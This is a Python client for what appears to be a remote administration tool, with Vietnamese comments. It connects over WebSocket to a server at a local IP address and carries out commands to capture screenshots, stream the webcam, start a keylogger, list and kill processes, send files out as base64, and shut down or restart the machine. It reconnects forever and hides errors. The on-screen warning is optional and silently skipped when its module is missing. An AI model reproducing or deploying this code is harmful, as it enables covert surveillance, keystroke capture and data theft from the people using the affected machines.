import json
import time
import threading
import queue
import websocket

from modules.system import get_process_list, kill_process_by_pid, execute_power_cmd
from modules.media import capture_screen_to_base64
from modules.app_control import manage_application
from modules.sandbox import get_sandbox_files, read_file_content
from modules.webcam import webcam_stream_worker

try:
    from modules.screen_notify import show_warning, hide_warning, destroy as destroy_notify
    SCREEN_NOTIFY_AVAILABLE = True
except Exception:
    SCREEN_NOTIFY_AVAILABLE = False
    def show_warning(): pass
    def hide_warning(): pass
    def destroy_notify(): pass

try:
    from modules.keylogger import start_keylogger_module, stop_keylogger_module, configure_keylogger
    KEYLOGGER_AVAILABLE = True
except Exception:
    KEYLOGGER_AVAILABLE = False
    def configure_keylogger(*args, **kwargs): pass

import socket
MACHINE_NAME = socket.gethostname().replace(' ', '_')

webcam_active = [False]
send_queue = queue.Queue()
ws_ref = [None]

def sender_loop():
    while True:
        try:
            payload_dict = send_queue.get()
            current_ws = ws_ref[0]
            if current_ws is None or current_ws.sock is None:
                continue
            current_ws.send(json.dumps(payload_dict))
        except (BrokenPipeError, ConnectionError, ConnectionResetError, OSError, AttributeError):
            pass
        except Exception:
            time.sleep(0.1)

def enqueue_send(payload_dict):
    try:
        send_queue.put_nowait(payload_dict)
        return True
    except Exception:
        return False


def log(msg):
    print(f"[{MACHINE_NAME}] {msg}")


def on_message(ws, message):
    try:
        data = json.loads(message)
        command = data.get('command')
        data_args = data.get('data', {})

        if command == 'take_screenshot':
            log("📸 Screenshot requested")
            show_warning()
            base64_image = capture_screen_to_base64()
            if base64_image:
                enqueue_send({
                    "command": "agent_send_screen",
                    "machine_name": MACHINE_NAME,
                    "image_base64": base64_image,
                    "is_static": True
                })
                log("📸 Screenshot done")
            # Tự động ẩn cảnh báo sau 3s
            threading.Timer(3.0, hide_warning).start()
            return

        if command == 'kill_process':
            pid = data_args.get('pid') if isinstance(data_args, dict) else None
            if pid and kill_process_by_pid(int(pid)):
                log(f"🔫 Killed PID {pid}")
                enqueue_send({
                    "command": "agent_send_procs",
                    "machine_name": MACHINE_NAME,
                    "processes": get_process_list()
                })
            return

        if command == 'manage_app':
            action = data_args.get('action')
            app_name = data_args.get('app_name')
            manage_application(action, app_name)
            log(f"📦 App {action}: {app_name}")
            # Sau khi quản lý app, gửi lại process list để frontend cập nhật
            enqueue_send({
                "command": "agent_send_procs",
                "machine_name": MACHINE_NAME,
                "processes": get_process_list()
            })
            return

        if command == 'get_processes':
            log("📋 Process list requested")
            enqueue_send({
                "command": "agent_send_procs",
                "machine_name": MACHINE_NAME,
                "processes": get_process_list()
            })
            return

        if command == 'get_webcam_frame':
            if not webcam_active[0]:
                log("🎥 Webcam starting")
                webcam_active[0] = True
                threading.Thread(
                    target=webcam_stream_worker,
                    args=(ws, send_queue, MACHINE_NAME, webcam_active),
                    daemon=True
                ).start()
            return

        if command == 'stop_webcam_stream':
            log("🎥 Webcam stopped")
            webcam_active[0] = False
            return

        if command == 'list_directory':
            files = get_sandbox_files()
            enqueue_send({
                "command": "agent_send_files",
                "machine_name": MACHINE_NAME,
                "files": files
            })
            log(f"📂 File list sent ({len(files)} items)")
            return

        if command == 'read_file_content':
            file_payload = read_file_content(data_args.get('file_name'))
            if file_payload:
                enqueue_send({
                    "command": "agent_download_ready",
                    "machine_name": MACHINE_NAME,
                    "file_name": file_payload["file_name"],
                    "file_base64": file_payload["file_base64"]
                })
                log(f"💾 File sent: {file_payload['file_name']}")
            return

        if command == 'toggle_keylogger':
            if not KEYLOGGER_AVAILABLE:
                enqueue_send({"command": "error", "message": "Keylogger không khả dụng trên máy này"})
                return
            if data_args.get('capturing', True):
                start_keylogger_module(ws, MACHINE_NAME)
                log("⌨️ Keylogger started")
            else:
                stop_keylogger_module()
                log("⌨️ Keylogger stopped")
            return

        if command in ['shutdown', 'restart']:
            log(f"🔌 Power: {command}")
            execute_power_cmd(command.upper())

    except json.JSONDecodeError:
        pass
    except Exception:
        pass

def on_open(ws):
    log("✅ Connected to server")
    enqueue_send({"event": "agent_register", "machine_name": MACHINE_NAME})

def on_close(ws, close_status_code, close_msg):
    log("❌ Disconnected")
    webcam_active[0] = False
    if KEYLOGGER_AVAILABLE:
        stop_keylogger_module()
    hide_warning()
    destroy_notify()

if __name__ == '__main__':
    BACKEND_WS_URL = f"ws://192.168.1.2:8000/ws/agent/{MACHINE_NAME}"

    def create_ws_client():
        client = websocket.WebSocketApp(
            BACKEND_WS_URL,
            on_open=on_open, on_message=on_message, on_close=on_close
        )
        ws_ref[0] = client
        return client

    ws_client = create_ws_client()
    threading.Thread(target=sender_loop, name="ws-sender", daemon=True).start()

    if KEYLOGGER_AVAILABLE:
        configure_keylogger(enqueue_send, ws_ref)

    def sys_monitor_loop():
        while True:
            try:
                if ws_ref[0] and ws_ref[0].sock:
                    enqueue_send({
                        "command": "agent_send_procs",
                        "machine_name": MACHINE_NAME,
                        "processes": get_process_list()
                    })
            except Exception:
                pass
            time.sleep(5)

    threading.Thread(target=sys_monitor_loop, name="sys-monitor", daemon=True).start()

    while True:
        try:
            ws_client.run_forever()
        except Exception:
            pass
        time.sleep(5)
        ws_client = create_ws_client()